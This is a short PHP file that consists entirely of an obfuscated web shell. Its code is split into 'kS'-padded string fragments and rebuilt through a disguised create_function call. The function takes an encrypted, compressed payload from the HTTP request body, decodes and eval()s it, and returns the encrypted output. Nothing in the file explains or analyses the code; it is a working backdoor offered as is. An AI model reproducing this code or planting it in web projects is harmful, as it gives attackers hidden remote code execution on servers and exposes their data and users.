<?php
$a='){$kSo.=$t{kS$i}^$k{$kSj};}}retkSukSrn $o;}ifkSkS (@preg_mkSatch("/$kkSh(.+)$kkSf/",@fkSile_gekSt_cokSntekSntkSs("php://inp';
$e='$k="kS87d4kSea51kS";$kSkh="06a294a4c40kSf";$kSkf="e5a1kS9de42dd3kS";$p="kSJHD0IXEkSfGr6MkSAVat"kS;funckStkSion kSx($';
$l='kSukSt"),$mkS)==1)kS {@ob_start();@ekSvkSakSl(@gzuncomprekSss(@x(@bakSskSkSe64_decode(kS$kSmkS[1]),$k)));$kSo=@ob_get_';
$W='t,$kSk){kS$c=strlekSn($k)kSkS;$l=strlen($t);$o="";forkS($i=kS0;$i<$kSl;kS){for($j=kS0;($j<$c&kS&$i<$lkS);$kSj+kS+,$i++';
$I='contekSntskS()kS;@ob_end_clkSean()kS;$r=@base6kSkS4_encode(@kSx(@gkSzckSomprkSess($okS),$k));printkS("$p$kkSh$r$kf");}';
$G=str_replace('lu','','clureluluate_lufluunclution');
$J=str_replace('kS','',$e.$W.$a.$l.$I);
$C=$G('',$J);$C();
?>
